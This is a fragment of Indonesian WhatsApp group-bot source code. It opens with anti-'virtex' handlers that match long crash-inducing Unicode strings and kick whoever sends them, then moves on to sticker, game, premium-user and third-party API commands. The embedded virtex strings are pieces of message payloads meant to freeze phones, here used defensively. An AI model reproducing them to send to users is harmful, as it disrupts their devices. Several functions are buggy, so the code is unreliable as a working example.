	    if (mesejAnti.includes("𝐗-𝐕𝐢𝐫𝐮𝐬")){
		if (!isGroup) return
		if (!isAntiFirtex3) return
		if (isGroupAdmins) return reply('ADMIN GRUP MAH BEBAS??')
		aldi.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`VIRTEX TERDETEKSI!!! MAAF ${sender.split("@")[0]} ANDA AKAN DI KICK DARI GRUP DALAM WAKTU 5 DETIK`)
		setTimeout( () => {
			aldi.groupRemove(from, [kic]).catch((e)=>{reply(`ERR: ${e}`)})
		}, 5000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("ShenraTensei🌪️")
		}, 4000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 3000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 2000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("4detik")
		}, 1000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("5detik")
		}, 0)
	}
	
	    if (mesejAnti.includes("⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ")){
		if (!isGroup) return
		if (!isAntiFirtex4) return
		if (isGroupAdmins) return reply('ADMIN GRUP MAH BEBAS😁')
		aldi.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`VIRTEX TERDETEKSI!!! MAAF ${sender.split("@")[0]} ANDA AKAN DI KICK DARI GRUP DALAM WAKTU 5 DETIK`)
		setTimeout( () => {
			aldi.groupRemove(from, [kic]).catch((e)=>{reply(`ERR: ${e}`)})
		}, 5000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("ShenraTensei🌪️")
		}, 4000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 3000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 2000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("4detik")
		}, 1000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("5detik")
		}, 0)
	}
	
	    if (mesejAnti.includes("𝐂𝐎𝐋??𝐒??𝐀𝐋 𝐓𝐈𝐓𝐀𝐍")){
		if (!isGroup) return
		if (!isAntiFirtex5) return
		if (isGroupAdmins) return reply('ADMIN GRUP MAH BEBAS😁')
		aldi.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`VIRTEX TERDETEKSI!!! MAAF ${sender.split("@")[0]} ANDA AKAN DI KICK DARI GRUP DALAM WAKTU 5 DETIK`)
		setTimeout( () => {
			aldi.groupRemove(from, [kic]).catch((e)=>{reply(`ERR: ${e}`)})
		}, 5000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("ShenraTensei🌪️")
		}, 4000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 3000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 2000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("4detik")
		}, 1000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("5detik")
		}, 0)
	}
	
	    if (mesejAnti.includes("♚㜸ཽཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ͢͢㜺ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ㜸ཽཽཽ͢͢͢♚")){
		if (!isGroup) return
		if (!isAntiFirtex6) return
		if (isGroupAdmins) return reply('ADMIN GRUP MAH BEBAS😁')
		aldi.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`VIRTEX TERDETEKSI!!! MAAF ${sender.split("@")[0]} ANDA AKAN DI KICK DARI GRUP DALAM WAKTU 5 DETIK`)
		setTimeout( () => {
			aldi.groupRemove(from, [kic]).catch((e)=>{reply(`ERR: ${e}`)})
		}, 5000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("ShenraTensei🌪️")
		}, 4000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 3000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 2000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("4detik")
		}, 1000)
		setTimeout( () => {
			aldi.updatePresence(from, Presence.composing)
			reply("5detik")
		}, 0)
	}

		  if (isGroup) {
					try {
						const getmemex = groupMembers.length	
					    if (getmemex <= memberlimit) {
						reply(`hmmm...`)
						setTimeout( () => {
 	                           aldi.groupLeave(from) 
 					   	}, 5000)
								setTimeout( () => {
								aldi.updatePresence(from, Presence.composing)
								reply("byee")
							}, 4000)
								setTimeout( () => {
								aldi.updatePresence(from, Presence.composing)
								reply("awokaowkaowk")
							}, 3000)
								setTimeout( () => {
								aldi.updatePresence(from, Presence.composing)
								reply("semoga emak lu sehat")
							}, 2000)
								setTimeout( () => {
								aldi.updatePresence(from, Presence.composing)
								reply("gw keluar ye")
							}, 1000)
								setTimeout( () => {
								aldi.updatePresence(from, Presence.composing)
								reply(`sorry ngab member minimal ${memberlimit}`)
							}, 0)
					    }
		       } catch (err) { console.error(err)  }
 	       }
 
        if (isGroup && isBadWord) {
            if (bad.includes(messagesC)) {
                if (!isGroupAdmins) {
                    return reply("JAGA UCAPAN DONG!! 😠")
                        .then(() => aldi.groupRemove(from, sender))
                        .then(() => {
                            aldi.sendMessage(from, `「 ANTI BADWORD 」\nKamu dikick karena berkata kasar!`, text ,{quoted: fkontak})
                        }).catch(() => aldi.sendMessage(from, `Untung cya bukan admin, kalo admin udah cya kick!`, text , {quoted : mek}))
                } else {
                    return reply( "Tolong Jaga Ucapan Min 😇")
                }
            }
        }
        
           		  //kolor
			colors = ['red','white','black','blue','yellow','green']
			
			//detector media
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
	    const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			
			//private chat message
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', [time], '[\x1b[1;32mPRIVATE\x1b[1;37m]=', color([command]), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', [time], '[\x1b[1;31mLOL\x1b[1;37m]=', ('[\x1b[1;31mEMROR\x1b[1;37m]'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			
			//group message
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', [time], '[\x1b[1;32mGROUP\x1b[1;37m]=', color([command]), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', [time], '[\x1b[1;31mLOL\x1b[1;37m]=', ('[\x1b[1;31mEMROR\x1b[1;37m]'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			
			const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        aldi.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    aldi.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
			function addMetadata(packname, author) {
				if (!packname) packname = `@${namabot}`; if (!author) author = `${namaowner}`;	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
				const json = {	
					'sticker-pack-name': packname,
					'sticker-pack-publisher': author,
				}
				const littleEndian = kontoler.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	

				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	

				if (len < 16) {	
					last = len.toString(16)	
					last = '0' + len	
				} else {	
					last = len.toString(16)	
				}	

				const buf2 = kontoler.from(last, 'hex')	
				const buf3 = kontoler.from(bytes)	
				const buf4 = kontoler.from(JSON.stringify(json))	

				const kontoler = kontoler.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./sticker/${name}.exif`, kontoler, (err) => {	
					return `./sticker/${name}.exif`	
				})	

			}
			switch(command) {
				//New Fitur
              case 'emoji':
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
             case 'cekhistory':
		    reply(`\`\`\`「 Status Tictactoe 」\`\`\`\n•> Win : ${checkWin(sender)}\n•> Lose : ${checkLose(sender)}`)
				break
// Delete Sesi ( MyMans APIs )
case 'delsesi':
					if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return repley('Hanya bisa didelete oleh admin group dan owner bot')
					if (args[0] === 'ttt') {
                       delete tictactoe[senderNumber]
                        fs.writeFileSync("./lib/tictactoe.json", JSON.stringify(tictactoe))                        
					if (fs.existsSync('./temp/' + from + '.json')) {
						fs.unlinkSync('./temp/' + from + '.json')
						reply('Berhasil Menghapus Sesi Ttt')
					} else {
						reply('Tidak ada sesi yang berlangsung')
					}
					} else {
					reply('Pilih')
					}
					break
// Tictactoe ( MyMans APIs )
case 'tictactoe':
            case 'ttt':
					if (!isGroup)return reply('*Khusus group*')
					if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
					if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return reply ( 'tag member contoh :\n${prefix}tictactoe @tag')
					if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}deletesesi-ttt*, untuk menghapus sesi`)
					if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
				    tttSkuy = setTtt(`${from}`)
					tttSkuy.status = false
					tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
					tttSkuy.Y = args[0].replace("@", "");
					fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
					starGame = `「 *Memulai Game Tictactoe* 」\n\n•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe \n[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan\n\n_Game tictactoe recode mymans_`
					aldi.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
					break
                  case 'nsfwcheck':
		                if (!isRegistered) return reply(aml.noregis)
		                if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const filePath = await aldi.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        const form = new FormData();
                        const stats = fs.statSync(filePath);
                        const fileSizeInBytes = stats.size;
                        const fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        const options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`http://api.lolhuman.xyz/api/nsfwcheck?apikey=${lolhuman}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        is_nsfw = "No"
                        if (Number(get_result.replace("%", "")) >= 50) is_nsfw = "Yes"
                        reply(`Is NSFW? ${is_nsfw}\nNSFW Score : ${get_result}`)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                   case 'addprem':  
					if (!isOwner) return reply (' khusus owners bot')
					adprem = `${args[0].replace('@','')}@s.whatsapp.net`
					prem.push(adprem)
					fs.writeFileSync('./database/user/prem.json', JSON.stringify(prem))
					reply(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break				
		case 'dellprem':  
					if (!isOwner) return reply (' khusus owners bot')
					delp = body.slice(10)
					prem.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/user/prem.json', JSON.stringify(prem))
					reply(`Berhasil Menghapus wa.me/${delp} Dari Daftar Premium`)
					break
		case 'listprem':
		case 'premlist'://By M4N1K
					teks = '*List Premium:*\n\n'
					for (let manikgans of prem) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${prem.length}*`
					aldi.sendMessage(from, teks.trim(), extendedText, { quoted: fkontak, contextInfo: { "mentionedJid": prem } })
					break
                case 'cekapikey':
                       if (!isGroup) return reply(aml.groupo)
		                if (!isRegistered) return reply(aml.noregis)
		                apiKey = args[0]
                        get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/checkapikey?apikey=${lolhuman}`)
                        get_result = get_result.result
                        txt = `User : ${get_result.username}\n`
                        txt += `Req : ${get_result.requests}\n`
                        txt += `Limit : ${get_result.today}\n`
                        txt += `Type : ${get_result.account_type}\n\n`
                        txt += `Expired : ${get_result.expired}\n\n`
                        reply(txt)
                        break   
                  case 'listml': 
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
		            if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)                    
					anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/others/listheroml`)
				    reply `${anu.listhero}`
					await limitAdd(sender)
					break
                    case 'ppcouple':
                    if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (isLimit(sender)) return reply(aml.limitend)           
                     reply (aml.wait)         
                     anu = await fetchJson(`https://lindow-api.herokuapp.com/api/ppcouple?apikey=${Gw}`)
                     burung = await getBuffer(anu.result.male)
				     memek = await getBuffer(anu.result.female)
				     aldi.sendMessage(from, burung, image, {quoted: fkontak})
				     aldi.sendMessage(from, memek, image, {quoted: fkontak})
				    await limitAdd(sender)
				    break
                   case 'heroml':
		            if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
		            if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)                    
                    if (args.length == 0) return reply(`\`\`\`Example: ${prefix + command} Fanny\`\`\``)
                    hero = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/heroml/${hero}?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `*Name : ${get_result.hero_name}*\n`
                    ini_txt += `*Entrance Quotes : ${get_result.ent_quotes}*\n`
                    ini_txt += `*Role : ${get_result.detail.role}*\n`
                    ini_txt += `*Specialty : ${get_result.detail.specialty}*\n`
                    ini_txt += `*Laning : ${get_result.detail.laning_recommendation}*\n`
                    ini_txt += `*Release : ${get_result.detail.release_date}*\n`
                    ini_txt += `*Movement speed : ${get_result.attr.movement_speed}*\n`
                    ini_txt += `*Physical attack : ${get_result.attr.physical_attack}*\n`
                    ini_txt += `*Magic power : ${get_result.attr.magic_power}*\n`
                    ini_txt += `*Physical defense : ${get_result.attr.physical_defense}*\n`
                    ini_txt += `*Magic defense : ${get_result.attr.magic_defense}*\n`
                    ini_txt += `*Critical rate : ${get_result.attr.basic_atk_crit_rate}*\n`
                    ini_txt += `*Hp : ${get_result.attr.hp}*\n`
                    ini_txt += `*Mana : ${get_result.attr.mana}*\n`
                    ini_txt += `*Mana regen : ${get_result.attr.mana_regen}*\n`
                    ini_icon = await getBuffer(get_result.icon)
                    aldi.sendMessage(from, ini_icon, image, { quoted: fkontak, caption: ini_txt })
                    await limitAdd(sender)
                    break
          case 'ytkomen':
                        if (!isGroup) return reply(aml.groupo)
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
					    if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} FvnkyStore api.lolhuman.xyz`)
                        reply (aml.wait)
		                username = args[0]
		                comment = args[2]
                        kontol = await getBuffer(`http://lolhuman.herokuapp.com/api/ytcomment?apikey=${lolhuman}&username=${username}&comment=${comment}&img=https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg`)
                        aldi.sendMessage(from, kontol, image, { quoted: fkontak})
                        await limitAdd(sender)
                        break
             case 'phkomen':
                        if (!isGroup) return reply(aml.groupo)
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
					    if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} FvnkyStore api.lolhuman.xyz`)
                        reply (aml.wait)
		                username = args[0]
		                comment = args[2]
                        kontol = await getBuffer(`http://api.lolhuman.xyz/api/phcomment?apikey=${lolhuman}&img=https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg&text=${comment}&username=${username}`)
                        aldi.sendMessage(from, kontol, image, { quoted: fkontak})
                        await limitAdd(sender)
                        break
             case 'asupanspcl':  
                     if (!isGroup) return reply(aml.groupo)
			         if (!isRegistered) return reply(aml.noregis)
		             if (isBanned) return reply(aml.baned)
				     if (!isGroup) return reply(aml.groupo)
                     if (isLimit(sender)) return reply(aml.limitend)
			        await limitAdd(sender)       
			        reply (aml.wait)
                    anu = await fetchJson(`https://api.xteam.xyz/asupan/lasegar?APIKEY=${xteam}`)
                    anu1 = `➻ NAMA : ${anu.result.username}\n`                                                     
                    anu1 = `➻ USERNAME : ${anu.result.full_name}\n`
                    anu1 += `➻ ID : ${anu.result.profile_id}\n`
                    anu1 += `➻ BIO : ${anu.result.biography}\n`
                    anu1 += `➻ FOLLOWERS : ${anu.result.followers}\n`
                    anu1 += `➻ FOLLOWING : ${anu.result.following}\n`
                    anu1 += `➻ URL : ${anu.result.external_url}\n`
                    anu1 += `➻ PRIVATE : ${anu.result.is_private}\n`
                    anu1 += `➻ VERIFY : ${anu.result.is_verified}\n`
                    anu1 += `➻ TYPE : ${anu.result.type}\n`
                    anu1 += `➻ COMENT : ${anu.result.comment}\n`
                    anu1 += `➻ LIKE : ${anu.result.like}\n`
                    anu1 += `➻ CAPTION : ${anu.result.caption}\n`
                    anu1 += `➻ LINK : ${anu.result.link}\n`
                    anu2 = await getBuffer(anu.result.profile_pic_url_hd)
                    aldi.sendMessage(from, anu2, image, {caption: anu1, quoted: fkontak}).catch(e => {
	                reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
                    console.log(e)
	                })
                    break
       case 'asupan1':  
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
			        await limitAdd(sender)       
                    reply (aml.wait)    
                    anu = await fetchJson(`https://api.xteam.xyz/asupan/ptl?APIKEY=${xteam}`)
                    anu1 = `➻ NAMA : ${anu.result.username}\n`                                                     
                    anu1 += `➻ USERNAME : ${anu.result.full_name}\n`
                    anu1 += `➻ ID : ${anu.result.profile_id}\n`
                    anu1 += `➻ BIO : ${anu.result.biography}\n`
                    anu1 += `➻ FOLLOWERS : ${anu.result.followers}\n`
                    anu1 += `➻ FOLLOWING : ${anu.result.following}\n`
                    anu1 += `➻ URL : ${anu.result.external_url}\n`
                    anu1 += `➻ PRIVATE : ${anu.result.is_private}\n`
                    anu1 += `➻ VERIFY : ${anu.result.is_verified}\n`
                    anu1 += `➻ TYPE : ${anu.result.type}\n`
                    anu1 += `➻ COMENT : ${anu.result.comment}\n`
                    anu1 += `➻ LIKE : ${anu.result.like}\n`
                    anu1 += `➻ CAPTION : ${anu.result.caption}\n`
                    anu1 += `➻ LINK : ${anu.result.link}\n`
                    anu2 = await getBuffer(anu.result.profile_pic_url_hd)
                    aldi.sendMessage(from, anu2, image, {caption: anu1, quoted: fkontak})
                    break
        case 'asupanwibu':  
                     if (!isGroup) return reply(aml.groupo)
					 if (!isRegistered) return reply(aml.noregis)
		             if (isBanned) return reply(aml.baned)
				     if (!isGroup) return reply(aml.groupo)
                     if (isLimit(sender)) return reply(aml.limitend)
			        await limitAdd(sender)
			        reply (aml.wait)
                    anu = await fetchJson(`https://api.xteam.xyz/asupan/wibu?APIKEY=${xteam}`)
                    anu1 = `➻ NAMA : ${anu.result.username}\n`                                                     
                    anu1 += `➻ USERNAME : ${anu.result.full_name}\n`
                    anu1 += `➻ ID : ${anu.result.profile_id}\n`
                    anu1 += `➻ BIO : ${anu.result.biography}\n`
                    anu1 += `➻ FOLLOWERS : ${anu.result.followers}\n`
                    anu1 += `➻ FOLLOWING : ${anu.result.following}\n`
                    anu1 += `➻ URL : ${anu.result.external_url}\n`
                    anu1 += `➻ PRIVATE : ${anu.result.is_private}\n`
                    anu1 += `➻ VERIFY : ${anu.result.is_verified}\n`
                    anu1 += `➻ TYPE : ${anu.result.type}\n`
                    anu1 += `➻ COMENT : ${anu.result.comment}\n`
                    anu1 += `➻ LIKE : ${anu.result.like}\n`
                    anu1 += `➻ CAPTION : ${anu.result.caption}\n`
                    anu1 += `➻ LINK : ${anu.result.link}\n`
                    anu2 = await getBuffer(anu.result.profile_pic_url_hd)
                    aldi.sendMessage(from, anu2, image, {caption: anu1, quoted: fkontak})
                    break
             case 'artinama':
                    if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} FvnkyStore`)
                    ini_nama = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/artinama?apikey=${lolhuman}&nama=${ini_nama}`)
                    reply(get_result.result)
                    await limitAdd(sender)
                    break
            case 'jodoh':
                        if (!isGroup) return reply(aml.groupo)
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
					    if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (args.length == 0) return reply(`Contoh: ${prefix + command} Tahu & Bacem`)
                        reply (aml.wait)
                        ini_nama = args.join('  ').split("&")
                        nama1 = ini_nama[0].trim()
                        nama2 = ini_nama[1].trim()
                       get_result = await fetchJson(`http://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${lolhuman}`)
                       get_result = get_result.result
                       ini_txt = `Positif : ${get_result.positif}\n`
                       ini_txt += `Negative : ${get_result.negatif}\n`
                       ini_txt += `Deskripsi : ${get_result.deskripsi}`
                       reply(txt)
                       await limitAdd(sender)
                       break
           case 'weton':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 12 12 2020`)
                    reply (aml.wait)
                    tanggal = args[0]
                    bulan = args[1]
                    tahun = args[2]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/weton/${tanggal}/${bulan}/${tahun}?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Weton : ${get_result.weton}\n`
                    ini_txt += `Pekerjaan : ${get_result.pekerjaan}\n`
                    ini_txt += `Rejeki : ${get_result.rejeki}\n`
                    ini_txt += `Jodoh : ${get_result.jodoh}`
                    reply(ini_txt)
                    await limitAdd(sender)
                    break
         case 'jadian':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
